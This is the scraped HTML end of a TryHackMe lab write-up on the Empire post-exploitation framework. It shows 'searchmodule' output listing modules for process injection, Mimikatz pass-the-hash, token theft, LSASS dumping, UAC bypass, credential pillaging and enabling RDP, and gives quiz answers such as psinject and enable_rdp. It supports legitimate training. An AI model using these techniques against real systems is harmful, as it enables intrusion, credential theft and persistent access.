class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Finds shares on machines in the domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/find_gpo_computer_admin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Takes a computer (or GPO) object and determines what users/groups have</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        administrative access over it. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_dfs_share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns a list of all fault-tolerant distributed file systems for a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        given domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_forest_domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Return all domains for a given forest. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Query information for a given user or users in the specified domain.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/collection/netripper</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Injects NetRipper into targeted processes, which uses API hooking in</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        order to intercept network traffic and encryption related functions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        from a low privileged user, being able to capture both plain-text</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        traffic and encrypted traffic before encryption/after decryption.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/recon/find_fruit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Searches a network range for potentially vulnerable web services.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/recon/fetch_brute_local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will logon to a member server using the agents account or</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        a provided account, fetch the local accounts and perform a network</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        based brute force attack.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>recon</code></p><ol start="12"><li>Our process we have compromised might not be the most stable, how do we migrate to another process? (This will have a specific module answer)</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; searchmodule process</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/management/osx/shellcodeinject64*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Inject shellcode into a x64 bit process</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/tokens</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs PowerSploit&#x27;s Invoke-TokenManipulation to enumerate Logon Tokens</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        available and uses them to create new processes. Similar to</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Incognito&#x27;s functionality. Note: if you select ImpersonateUser or</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        CreateProcess, you must specify one of Username, ProcessID, Process,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        or ThreadId.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/mimikatz/pth*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs PowerSploit&#x27;s Invoke-Mimikatz function to execute sekurlsa::pth</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to create a new process. with a specific user&#x27;s hash. Use</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        credentials/tokens to steal the token afterwards.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/host/paranoia*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Continuously check running processes for the presence of suspicious</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        users, members of groups, process names, and for any processes running</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        off of USB drives.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/process_hunter</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Query the process lists of remote machines, searching for processes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        with a specific name or owned by a specific user. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/collection/minidump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Generates a full-memory dump of a process. Note: To dump another</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        user&#x27;s process, you must be running from an elevated prompt (e.g to</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        dump lsass)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/collection/netripper</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Injects NetRipper into targeted processes, which uses API hooking in</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        order to intercept network traffic and encryption related functions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        from a low privileged user, being able to capture both plain-text</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        traffic and encrypted traffic before encryption/after decryption.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/trollsploit/process_killer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Kills any process starting with a particular name.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/trollsploit/rick_ascii</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Spawns a a new powershell.exe process that runs Lee Holmes&#x27; ASCII Rick</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Roll.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/trollsploit/rick_astley</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs @SadProcessor&#x27;s beeping rickroll.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/reflective_inject</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        which executes PS codefrom memory in a remote process</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/psinject</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Utilizes Powershell to to inject a Stephen Fewer formed ReflectivePick</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        which executes PS codefrom memory in a remote process. ProcID or</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ProcName must be specified.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/spawn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Spawns a new agent in a new powershell.exe process.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/shinject</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Injects a PIC shellcode payload into a target process, via Invoke-</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Shellcode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/code_execution/invoke_dllinjection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Uses PowerSploit&#x27;s Invoke-DLLInjection to inject  a Dll into the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        process ID of your choosing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/code_execution/invoke_reflectivepeinjection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Uses PowerSploit&#x27;s Invoke-ReflectivePEInjection to reflectively load a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        DLL/EXE in to the PowerShell process or reflectively load a DLL in to</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        a remote process.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/code_execution/invoke_shellcodemsil</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Execute shellcode within the context of the running PowerShell process</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        without making any Win32 function calls. Warning: This script has no</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        way to validate that your shellcode is 32 vs. 64-bit!Note: Your</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        shellcode must end in a ret (0xC3) and maintain proper stack alignment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        or PowerShell will crash!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/code_execution/invoke_shellcode</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Uses PowerSploit&#x27;s Invoke--Shellcode to inject shellcode into the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        process ID of your choosing or within the context of the running</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        PowerShell process. If you&#x27;re injecting custom shellcode, make sure</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        it&#x27;s in the correct format and matches the architecture of the process</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        you&#x27;re injecting into.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/ask</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Leverages Start-Process&#x27; -Verb runAs option inside a YES-Required loop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to prompt the user for a high integrity context before running the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        agent code. UAC will report Powershell is requesting Administrator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        privileges. Because this does not use the BypassUAC DLLs, it should</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        not trigger any AV alerts.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/privesc/bypassuac</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs a BypassUAC attack to escape from a medium integrity process to a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        high integrity process. This attack was originally discovered by Leo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Davidson. Empire uses components of MSF&#x27;s bypassuac injection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        implementation as well as an adapted version of PowerSploit&#x27;s Invoke--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Shellcode.ps1 script for backend lifting.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>powershell/management/psinject</code></p><ol start="13"><li>Last but not least, what module can we use to turn on remote desktop access for our purposes?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">(Empire: FKRDZB8C) &gt; searchmodule rdp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/collection/osx/pillage_user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Pillages the current user for their keychain, bash_history, ssh known</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        hosts, recent folders, etc. For logon.keychain, use</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        https://github.com/n0fate/chainbreaker .For other .plist files, check</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        https://davidkoepi.wordpress.com/2013/07/06/macforensics5/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/credentials/sessiongopher</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Extract saved sessions &amp; passwords for WinSCP, PuTTY, SuperPuTTY,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        FileZilla, RDP, .ppk files, .rdp files, .sdtid files</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_rdp_session</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Query a given RDP remote service for active sessions and originating</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        IPs (replacement for qwinsta). Note: needs admin rights on the remote</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        server you&#x27;re querying</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_cached_rdpconnection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Uses remote registry functionality to query all entries for the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Windows Remote Desktop Connection Client&quot; on a machine. Part of</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/find_gpo_location</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Takes a user/group name and optional domain, and determines the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        computers in the domain the user/group has local admin (or RDP) rights</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/enable_rdp*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Enables RDP on the remote machine and adds a firewall exception.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/enable_multi_rdp*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        [!] WARNING: Experimental! Runs PowerSploit&#x27;s Invoke-Mimikatz function</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to patch the Windows terminal service to allow multiple users to</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        establish simultaneous RDP connections.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/management/disable_rdp*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Disables RDP on the remote machine.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>powershell/management/enable_rdp</code></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Overpass 2 - Hacked</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/Tryhackme/Peak Hill/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Peak Hill</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#deploy" class="table-of-contents__link toc-highlight">Deploy!</a></li><li><a href="#install" class="table-of-contents__link toc-highlight">Install</a></li><li><a href="#listeners" class="table-of-contents__link toc-highlight">Listeners</a></li><li><a href="#stagers" class="table-of-contents__link toc-highlight">Stagers</a></li><li><a href="#agents-and-post-exploitation" class="table-of-contents__link toc-highlight">Agents and Post-Exploitation</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>